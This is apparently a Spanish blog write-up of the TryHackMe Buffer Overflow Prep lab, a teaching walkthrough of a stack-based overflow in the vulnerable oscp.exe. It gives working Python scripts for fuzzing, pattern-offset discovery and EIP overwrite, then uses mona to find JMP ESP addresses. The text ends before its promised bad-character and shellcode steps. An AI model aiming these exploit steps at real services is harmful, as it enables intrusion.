---
layout      : post
title       : "TryHackMe - Buffer Overflow Prep"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_banner.png
category    : [ thm ]
tags        : [ buffer-overflow, ecppt ]
---
Entorno Windows. Jugaremos con un desbordamiento de buffer basado en la pila, lo aprovecharemos para enviar más datos de los necesarios y molestar al sistema, se cansará tanto de nosotros que nos ejecutará código malicioso remotamente.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_bufferoverflowprepTHM.png" style="width: 100%;"/>

## TL;DR (Spanish writeup)

**Laboratorio creado por**: [Tib3rius](https://tryhackme.com/p/Tib3rius).

Jugaremos con distintos **desbordamientos del buffer basados en la pila** (**buffer overflow stack-based**). Interactuaremos con un binario para entender el momento exacto en que se rompe al recibir más datos de los permitidos, tomaremos control de los registros encargados del flujo del programa, las librerías del binario nos darán una mano para saltar a otros registros, evitaremos corromper el proceso al usar caracteres traviesos y finalmente, ejecutaremos código malicioso en el sistema con ayuda del buffer (:

...

> La idea inicial de esta locura es tener mis "notas" por si algun día se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) 😄 La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo la oportunidad de ayudarlos ¿por qué no hacerlo?

> Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva más de enseñanza que de solo pasos a seguir. Sin menos, muchas gracias <3

...

El foco detrás de este entorno es permitirnos practicar un ataque llamado "desbordamiento de buffer" (en este caso, basado en la pila), más adelante explicaré algunos términos y algunas cositas, pero por lo pronto, este será nuestro recorrido hacia la perdición :P

1. [Introducción](#intro).
2. [Conociendo el laboratorio](#intro-lab).
3. [Buscando romper el programa](#fuzzing-phase).
4. [Encontrando el punto exacto de crasheo](#pattern-phase).
5. [Sobreescribiendo registro EIP para controlar el flujo](#overwriteeip-phase).
6. [Jugando con las librerías del programa para saltar por el mundo](#module-phase).
7. [Evitando corromper la data al usar malos caracteres](#badchars-phase).
8. [Ejecutando código malicioso en el buffer del programa](#shellcode-phase).

...

# Introducción [#](#intro) {#intro}

> Acá encuentras el entorno: [https://tryhackme.com/room/bufferoverflowprep](https://tryhackme.com/room/bufferoverflowprep)

En este caso, **TryHackMe** nos ofrece una máquina donde podremos practicar de varias formas un ataque llamado **desbordamiento de buffer**, en este caso basado en pila (**buffer overflow stack-based**). El ataque es directo, interactuar con los datos que recibe un programa para sobrepasar el almacenamiento permitido y sobreescribir partes de la memoria con código malicioso.

Las respuestas del laboratorio están basadas en el binario `oscp.exe`, el cual, en su lógica, cuenta con 10 distintos tipos de desbordamientos de buffer (en la pila) para jugar.

En este post te voy a explicar la resolución del primer buffer overflow: `OVERFLOW1`. Conociendo el paso a paso de este, puedes hacer los demás y cualquier otro basado en pila (:

Veamos algunos conceptos rápidos antes de meternos con el lab.

> ⚠️⚠️ <span style="color: red;">OJITO</span>: <span style="color: yellow;">Si ya estas familiarizado con la creación, levantamiento del entorno y demás conceptos, si gustas [puedes irte de una a la resolución del lab](#fuzzing-phase)</span>. ⚠️⚠️

## ConceptualizANDO [📌](#intro-definitions) {#intro-definitions}

💾 Ya sabemos de qué se trata el ataque, enviar más datos de los que puede almacenar el programa, logrando así sobreescribir partes de la memoria, para, con algo de malicia, ejecutar código malicioso.

🔋 La **pila** simplemente es una región de memoria que usa un programa para almacenar datos **temporales**.

📦 El **buffer** también míralo como un área para guardar, a veces muy pequeño, a veces muy grande, o sea, a veces con un tamaño fijo. ¿Pero qué pasa si es fijo? Que claramente en algún punto se puede llenar.

## RegistrANDO [📌](#intro-registers) {#intro-registers}

En todo el entorno hablaremos a veces de cosas como **EIP** y **ESP**, se llaman **registros**, ellos son los encargados de "contener" información para interactuar de distintas formas con la memoria.

> Existen muchos registros, tanto para `x16`, `x32`, `x64`, este entorno esta basado en la arquitectura `x32`, así que nos enfocaremos en ellos (:

De igual forma te comparto un lindo post donde hay varias definiciones y ejemplos:

* [x86 Assembly Guide](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html).

Por ejemplo, los registros que más usaremos serán los dos listados anteriormente:

| Registro | Nombre | Descripción |
| -------- | ------ | ----------- |
| EAX | Extended Accumulator | Un acumulador, usado para operaciones aritméticas. |
| EBX | Extended Base | Este loco sirve pa todo, almacenar datos temporales, operaciones aritméticas, apoyar a los punteros, jugar con los ciclos y moverse por la memoria. |
| ECX | Extended Counter | Usado para controlar el flujo del programa. |
| EDX | Extended Data | También usado (como EAX) para operaciones aritméticas, pero más largas. |
| ESI | Extended Source Index | Usado como índice de origen en operaciones donde nos movemos por la memoria. |
| EDI | Extended Destination Index | Al contrario que ESI, usado como índice de **destino** en operaciones donde nos movemos por la memoria. |
| ESP | Extended Stack Pointer | Es el encargado de manejar la pila de memoria, o sea, como se mueven los datos desde que entran hasta que salen de la memoria. |
| EBP | Extended Base Pointer | Es el gestor de funciones, parámetros y variables locales del programa. |
| EIP | Extended Instruction Pointer | Guarda la siguiente dirección en memoria a la cual irá el programa. |

Bien, ya con los conceptos puestos en la mesa nos podemos poner a jugar!

# Conociendo el entorno [#](#intro-lab) {#intro-lab}

Validando la información que nos entrega el laboratorio, tenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_labIntroCreds.png" style="width: 100%;"/>

Una máquina Windows 7 de 32 bits, con un debugger ya instalado llamado **Immunity Debugger** y algunos procesos deshabilitados para hacernos todo más sencillito.

Para conectarnos por [RDP](https://www.cloudflare.com/es-es/learning/access-management/what-is-the-remote-desktop-protocol/) a la máquina, podemos emplear la herramienta [remmina](https://www.redeszone.net/analisis/software/remmina-cliente-escritorio-remoto-linux/), usaremos las credenciales dadas (`admin:password`) para finalmente ver el escritorio del equipo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_labIntroRDP_desktop.png" style="width: 100%;"/>

Así mismo, en las instrucciones nos dan todos los pasos necesarios para configurar correctamente nuestro entorno:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_labIntroImmunityYncYoscpprogram.png" style="width: 100%;"/>

De nuevo nos habla de **Immunity Debugger**, rápidamente:

> 🔍 `Immunity Debugger` es un intermediario para validar las operaciones que el programa realiza contra el sistema, es usado por lo general para buscar malware (ingenieria inversa (o sea, toamr un programa y entender a nivel -lenguaje maquina- que hace) y para determinar errores que esten sucendiendo, todo esto en un programa.

---

## Anclamos la ejecución del programa a Immunity [📌](#intro-lab-attach) {#intro-lab-attach}

Peeerfecto, así que seguimos los pasos y encendemos el debugger junto al programa `oscp.exe`:

> En el escritorio clic derecho sobre **Immunity Debugger** y `Run as administrator`.

> Dentro, `File` > `Open` > Buscamos la carpeta `vulnerable-apps` > Seleccionamos la carpeta `oscp` > Seleccionamos `oscp.exe` > `Open`.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_labIntroImmunityOSCPloadedANDpaused.png" style="width: 100%;"/>

El programa está cargado, pero no ha iniciado, para ponerlo a correr podemos darle clic a la fecha roja del menú u oprimir `F9`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_labIntroImmunityOSCPrunning.png" style="width: 30%;"/>

Ya estaría, en la parte baja debería decir ahora `Running`.

Para testear el funcionamiento, ejecutamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_labIntroBashNCoscpRunning.png" style="width: 80%;"/>

Listo listo listo, ya estamos prestos para iniciar.

## Pasos a seguir para la explotación [📌](#intro-lab-steps) {#intro-lab-steps}

---

| Fase | Descripción |
| ---- | ----------- |
| [Fuzzeito](#fuzzing-phase) | Enviaremos muuuchos datos, buscando la forma de romper el programa |
| [Buscando al patrón](#pattern-phase) | Encontraremos la parte exacta en la que el programa se rompe |
| [Controlar EIP](#overwriteeip-phase) | Vamos a sobreescribir el registro EIP, logrando así el control del flujo del programa |
| [Encontrar la librería](#module-phase) | Iremos en búsqueda de instrucciones que nos permitan saltar al stack (ESP) |
| [Evitaremos los badchars](#badchars-phase) | Iteraremos sobre muchos caracteres para evitar aquellos que puedan corromper nuestro código malicioso |
| [Ejecutar shellcode](#shellcode-phase) | Ya podremos crear y ejecutar código malicioso en el sistema mediante el buffer |

La idea es que siempre que rompas el programa, desde el debugger lo vuelvas a iniciar, así no tienes que cerrar y abrir todo de nuevo:

> `Debug` > `Restart`. Y listo, hacer esto siempre que quieras volver a lanzar una prueba (y pues lo inicias con la flecha roja :P)

Tenemos todo, tooodo para empezar. Así que, a rompernos la cabeza un rato!

...

# Fuzzing [#](#fuzzing-phase) {#fuzzing-phase}

La idea es interactuar con el programa, enviar varias cadenas de distintas longitudes con la intención de almacenar más datos de los que el programa está dispuesto a procesar, logrando así corromper el almacenamiento y desbordar el buffer.

Manualmente, el proceso sería así:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_fuzzing_bash_nc_sendingManuallyAs.png" style="width: 100%;"/>

Pero es un poco lento y además aburrido :P Automaticemos eso...

Armamos un script en **Python** que mediante un bucle, envíe por ejemplo 100 veces la letra A (o cualquier letra) y que por cada iteración valide, si el programa deja de responder, si todo sigue funcionando, volverá a enviar información, pero ahora sumará 100 a esas 100 A previas, enviando así 200, así sucesivamente hasta que el programa deje de responder, cuando eso pase (si es que pasa :P), nos quedaremos con el valor de veces que se envió la letra A, ese será nuestro foco de ahí en adelante.

> Acuerdate de anclar el debugger al programa vulnerable.

```python
#!/usr/bin/python3

import socket
import time

# Datos de la máquina donde esta activo el programa vulnerable
HOST = "10.10.68.180"
PORT = 1337

cont = 0
cont_max = 10000
cont_to_multiply = 100

try:
    # Iteramos (en este caso) hasta 10000
    while cont <= cont_max:

        print(f"(+) Enviando {cont} A's")

        # Conexión con el programa
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect((HOST, PORT))
        server.settimeout(5) # si despues de 5 segundos no hay respuesta, se rompió
        from_server = server.recv(1024)
        
        # Exploit (acá va toda la data que será enviada al programa)
        payload = (
            b"OVERFLOW1 " +
            b"A" * cont
        )

        server.send(payload)

        from_server = server.recv(1024)
        server.close()

        cont += cont_to_multiply

        time.sleep(1)

except socket.timeout:
    print(f"(+) El programa dejó de responder al enviar {cont} A's")
    print(f"(+) Valor enviado: OVERFLOW1 A*{cont}")
    exit(0)
```

Ejecutamos y esperamos, pasado un tiempo, al enviar 2000 A's el programa deja de funcionar:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_fuzzing_bash_py_programCrashWith2000As.png" style="width: 80%;"/>

Y si revisamos el debugger, efectivamente el registro **EIP** (el que decide a qué dirección de memoria debe ir después) fue sobreescrito con un valor que no entiende: `41414141`, `41` es el valor [hexadecimal](https://www.ascii-code.com/es) de la letra `A`.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_fuzzing_debugger_programCrashWith2000As.png" style="width: 100%;"/>

Con esto ya tenemos la información que buscamos, con `2000 A's` el programa se rompe. Ahora nos queda identificar la posición exacta, el momento justo antes de llegar a **EIP** en el que el programa recibe más data de la necesaria y crashea.

Vamos a jugar con los patrones!!

# Buscando al patrón [#](#pattern-phase) {#pattern-phase}

En este paso vamos a usar algo llamado **patrones**, los patrones son cadenas únicas y están diseñadas para ayudar a monitorear y detectar el punto exacto en que una instrucción corrompe el programa.

¿Pero como sabemos la instrucción exacta? Apoyados de nuestro debugger, nos fijaremos en la siguiente instrucción a ejecutar (**EIP**) intente llegar a un valor erróneo, ese valor erróneo será la parte del patrón que necesitamos. Así conoceremos la posición exacta en la que podemos empezar a tener control sobre el flujo del programa.

> Reinicia el programa desde el Immunity: `Debug > Restart > Flecha roja para ejecutarlo`.

Nos apoyaremos de dos herramientas:

```bash
# Para crear el patrón
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
# Para buscar en ese patrón el valor de EIP
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
```

Creamos el patrón de **2000 A's**:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_pattern_bash_patternCreate2000.png" style="width: 100%;"/>

A mí me gusta tener un script para cada fase, así que dándole el formato necesario, así quedaría con el patrón a enviar:

```python
#!/usr/bin/python3

import socket

HOST = "10.10.68.180"
PORT = 1337

pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"

try:
    print(f"(+) Buscando al patrón!")

    # Connection
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((HOST, PORT))
    server.settimeout(5)
    from_server = server.recv(1024)
    
    # Exploit
    payload = (
        b"OVERFLOW1 " +
        pattern
    )

    server.send(payload)

    from_server = server.recv(1024)
    server.close()

except socket.timeout:
    print(f"(+) El programa dejó de responder...")
```

```bash
python3 pattern.py
```

Revisamos nuestro debugger y nos quedamos con el registro **EIP**, ese es el importante acá:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_pattern_debugger_EIPwithPatternOf2000.png" style="width: 100%;"/>

El valor que llega a **EIP** es: `6F43396E`.

Lo tomamos y buscamos en el patrón de 2000 a ver en que posición encuentra esa porción de texto.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2000 -q '6F43396E'
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_pattern_bash_patternOffset2000_EIPvalue.png" style="width: 100%;"/>

Epale, se necesitan `1978` caracteres justo antes de llegar a sobreescribir **EIP**!! Añañaii.

# Sobreescribiendo EIP [#](#overwriteeip-phase) {#overwriteeip-phase}

> Reinicia el programa (:

Según lo que obtuvimos mediante el patrón, sabemos que antes de poder llegar a **EIP** existen `1978` caracteres, por lo que en nuestro script le podemos pasar **1978 A's** seguido de valores identificables, por ejemplo `BCDE`, que serían en hexadecimal: `42434445`, si logramos ver ese valor en el registro **EIP**, ya estaríamos sobreescribiendo el puntero (:

```python
#!/usr/bin/python3

import socket

HOST = "10.10.68.180"
PORT = 1337

to_reach_EIP = 1978

try:
    print(f"(+) Sobreescribiendo EI Pe.")

    # Connection
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((HOST, PORT))
    server.settimeout(5)
    from_server = server.recv(1024)
    
    # Exploit
    payload = (
        b"OVERFLOW1 " +
        b"A" * to_reach_EIP +
        b"BCDE"
    )

    server.send(payload)

    from_server = server.recv(1024)
    server.close()

except socket.timeout:
    print(f"(+) El programa dejó de responder...")
```

```bash
python3 overwritEIP.py
```

Y en nuestro debugger:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_overwriteEIP_debugger_EIPwithBCDE.png" style="width: 100%;"/>

Si si siiiiii, lo estamos sobreescribiendo!! Aunque, no exactamente de la forma esperada, el valor `45444342` hace referencia a `EDCB`, nosotros enviamos `BCDE`... Todo tiene una explicación:

* [Arquitecturas little-endian y big-endian](https://patriciaemiguel.com/conceptos/2022/09/18/endianness.html).
* [Endianness](https://es.wikipedia.org/wiki/Endianness).

Al momento en que el sistema recibe datos (bytes), necesita saber en qué orden almacenarlos en memoria, para ello existen dos arquitecturas, `little-endian` y `big-endian`.

Con **little-endian** se ordena (guarda) del byte menos significativo al más significativo, el menos significativo se define en cuanto a la última posición escrita. Por lo que si recibe `0x42434445`, el valor menos significativo (la última posición) será `0x45`, lo que significa que se guardara de derecha a izquierda: `0x45444342`.

Con `big-endian` es al contrario, si se recibe `0x42434445`, se guarda del más significativo al menos significativo, o sea, del primero en ser escrito al último o mejor dicho, de izquierda a derecha: `0x42434445`.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_overwriteEIP_google_littleANDbigENDIAN.png" style="width: 100%;"/>

> Tomada de: [agilescientific.com - little-endian-is-legal](https://agilescientific.com/blog/2017/3/31/little-endian-is-legal)

¿En nuestro entorno que arquitectura tenemos?

Esato, se está viendo reflejado el uso de la arquitectura `little-endian`. **Tengamos esto en cuenta, lo usaremos más adelante**.

Ya logramos sobreescribir el registro `EIP`, ahora necesitamos aprovechar las instrucciones propias del programa para poder movernos al registro `ESP` y poder almacenar código malicioso.

# Encontrando módulo para saltar a la pila [#](#module-phase) {#module-phase}

---

> Reiniciamooooos programa (:

Lo que haremos ahora es aprovechar toda librería asociada al programa para entre ellas buscar una instrucción que nos permita saltar al registro `ESP`. Si lo logramos, podremos almacenar nuestro código malicioso en él (**ESP** es la pila, recuérdalo).

Usaremos [mona](https://github.com/corelan/mona), un script en **Python** que ayuda a automatizar y realizar todas estas labores más rápido. En este caso el programa ya está instalado en nuestro entorno. Pero si no estuviera, sería así:

> <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_google_githubMona_howToInstallMonaPY.png" style="width: 80%;"/>

Exploramos las librerías (módulos) asociados al programa, abajo a la izquierda en el campo de texto blanco, escribiremos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_module_debugger_monaModulesInput.png" style="width: 50%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_module_debugger_monaModulesOutput.png" style="width: 100%;"/>

```txt
0BA  -----------------------------------------------------------------------------------------------------------------------------------------
0BA   Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
0BA  -----------------------------------------------------------------------------------------------------------------------------------------
0BA   0x75900000 | 0x7590a000 | 0x0000a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [LPK.dll] (C:\Windows\system32\LPK.dll)
0BA   0x752d0000 | 0x752d6000 | 0x00006000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [NSI.dll] (C:\Windows\system32\NSI.dll)
0BA   0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False |  False   | False  | -1.0- [essfunc.dll] (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
0BA   0x76a30000 | 0x76afc000 | 0x000cc000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\Windows\system32\MSCTF.dll)
0BA   0x750e0000 | 0x7512a000 | 0x0004a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [KERNELBASE.dll] (C:\Windows\system32\KERNELBASE.dll)
0BA   0x74a10000 | 0x74a4c000 | 0x0003c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [mswsock.dll] (C:\Windows\system32\mswsock.dll)
0BA   0x752e0000 | 0x7537d000 | 0x0009d000 | True   | True    | True  |  True    | True   | 1.0626.7601.17514 [USP10.dll] (C:\Windows\system32\USP10.dll)
0BA   0x77060000 | 0x770ae000 | 0x0004e000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [GDI32.dll] (C:\Windows\system32\GDI32.dll)
0BA   0x75720000 | 0x757f4000 | 0x000d4000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [kernel32.dll] (C:\Windows\system32\kernel32.dll)
0BA   0x75d30000 | 0x75ddc000 | 0x000ac000 | True   | True    | True  |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\Windows\system32\msvcrt.dll)
0BA   0x76e80000 | 0x76fbc000 | 0x0013c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
0BA   0x76bd0000 | 0x76c71000 | 0x000a1000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [RPCRT4.dll] (C:\Windows\system32\RPCRT4.dll)
0BA   0x755d0000 | 0x75605000 | 0x00035000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WS2_32.dll] (C:\Windows\system32\WS2_32.dll)
0BA   0x00400000 | 0x00414000 | 0x00014000 | False  | False   | False |  False   | False  | -1.0- [oscp.exe] (C:\Users\admin\Desktop\vulnerable-apps\oscp\oscp.exe)
0BA   0x76b00000 | 0x76bc9000 | 0x000c9000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [user32.dll] (C:\Windows\system32\user32.dll)
0BA   0x75610000 | 0x7562f000 | 0x0001f000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [IMM32.DLL] (C:\Windows\system32\IMM32.DLL)
```

Ahí obtenemos toda librería asociada al programa, pero las únicas que nos van a servir son aquellas que cuenten con las mínimas (o ninguna) restricciones activadas (`Rebase`, `SafeSEH`, etc.), esto es importante, ya que si alguno de esos ítems está activo, nuestro proceso de explotación y aprovechamiento de esa librería puede verse perjudicado:

| Restricción | ¿Si está activada, que significa? |
| ----------- | ----------- |
| Rebase | Básicamente el programa modifica todo el tiempo la dirección base en memoria del programa cada vez que es ejecutado. |
| SafeSEH | Previene ataques donde se intenten aprovechar las excepciones del programa. |
| ASLR | El programa aleatoriza la ubicación de ciertas áreas, como la pila, las funciones. |
| NXCompat | Evita que las partes de la memoria que se pueden usar para ejecutar cositas, se usen como almacenadores. |
| OS Dll | Permite que las bibliotecas del programa se carguen en direcciones dinámicas (como ASLR). |

Teniendo en cuenta lo anterior, hay una sola librería que nos puede ayudar o al menos que es la que más restricciones tiene desactivadas, `essfunc.dll`.

```bash
0BA   0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False |  False   | False  | -1.0- [essfunc.dll] (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
```

Nos quedaremos con su nombre.

El siguiente paso es buscar dentro de esa librería, la instrucción que nos permita saltar al stack, en términos de lenguaje ensamblador (lenguaje máquina) sería [JMP ESP](https://en.wikipedia.org/wiki/JMP_(x86_instruction)). **JMP** es un condicional que realiza un **jump**, un salto ya sea a una dirección, a un registro, etc.

Es como si (por ejemplo) en un programa de **Python** se llamara a una función, el flujo saltaria a ella para poder ejecutarla.

Necesitamos conocer el valor haxedecimal de esa instrucción, para ello usaremos el programa `nasm_shell.rb`:

```bash
find / -name "*nasm_shell*" 2>/dev/null
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_module_bash_nasmShell_JMPESPinstruction.png" style="width: 100%;"/>

El valor hex de `JMP ESP` es `\xFF\xE4`, ese resultado es el importante para nosotros, aprovecharemos la libreria para extraer las direcciones en memoria donde ejecuta esa operación, así en nuestra fase de explotación la interacción de saltar contra el **ESP** la hará la libreria y no algo externo, con lo que nos aseguraremos el exito en la ejecución.

Usando `mona` lo buscamos así:

```bash
!mona find -s '\xFF\xE4' -m essfunc.dll
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/bufferoverflowprep/thmBufferoverflowprep_module_debugger_monaJMPESPinstructionInLibrary.png" style="width: 100%;"/>

Obtenemos 9 resultados, 9 momentos en los que la libreria hace uso de la instrucción `JMP ESP`, nos guardamos las direcciones:

```txt
0BADF00D           [+] Results :
625011AF             0x625011af : '\xFF\xE4' |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
625011BB             0x625011bb : '\xFF\xE4' |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
625011C7             0x625011c7 : '\xFF\xE4' |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
625011D3             0x625011d3 : '\xFF\xE4' |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
625011DF             0x625011df : '\xFF\xE4' |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
